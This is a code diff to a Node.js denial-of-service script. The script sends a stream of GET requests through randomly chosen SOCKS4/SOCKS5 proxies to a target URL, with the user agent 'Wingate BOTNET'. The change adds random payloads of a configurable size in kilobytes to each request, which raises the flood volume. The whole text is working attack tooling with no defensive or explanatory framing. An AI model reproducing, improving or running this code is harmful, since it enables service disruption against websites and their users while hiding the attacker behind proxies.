@@ -5,10 +5,20 @@ const { SocksClient } = require('socks');
 const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
 const socks5Proxies = fs.readFileSync('socks5.txt', 'utf8').split('\n').filter(Boolean);
 
-async function sendPacket(targetUrl, proxy, delay) {
+function generatePayload(kbSize) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let payload = '';
+    for (let i = 0; i < kbSize * 1024; i++) {
+        payload += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return payload;
+}
+
+async function sendPacket(targetUrl, proxy, delay, kbSize) {
     return new Promise((resolve, reject) => {
         const [proxyIp, proxyPort] = proxy.split(':');
         const target = new URL(targetUrl);
+        const payload = generatePayload(kbSize);
 
         const options = {
             proxy: {
@@ -37,10 +47,11 @@ async function sendPacket(targetUrl, proxy, delay) {
                 method: 'GET',
                 headers: {
                     'User-Agent': 'Wingate BOTNET',
+                    'Content-Length': Buffer.byteLength(payload),
                 },
                 socket: info.socket, 
             }, (res) => {
-                console.log(`Packet sent to ${targetUrl} via ${proxy}`);
+                console.log(`Packet sent to ${targetUrl} via ${proxy} with ${kbSize}KB payload`);
                 resolve();
             });
 
@@ -49,6 +60,7 @@ async function sendPacket(targetUrl, proxy, delay) {
                 reject(err);
             });
 
+            req.write(payload);
             req.end();
 
             if (delay > 0) {
@@ -58,12 +70,12 @@ async function sendPacket(targetUrl, proxy, delay) {
     });
 }
 
-function start(targetUrl, delay) {
+function start(targetUrl, delay, kbSize) {
     setInterval(() => {
         const proxyList = Math.random() < 0.5 ? socks4Proxies : socks5Proxies;
         const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
 
-        sendPacket(targetUrl, proxy, delay).catch(() => {});
+        sendPacket(targetUrl, proxy, delay, kbSize).catch(() => {});
     }, delay);
 }
 
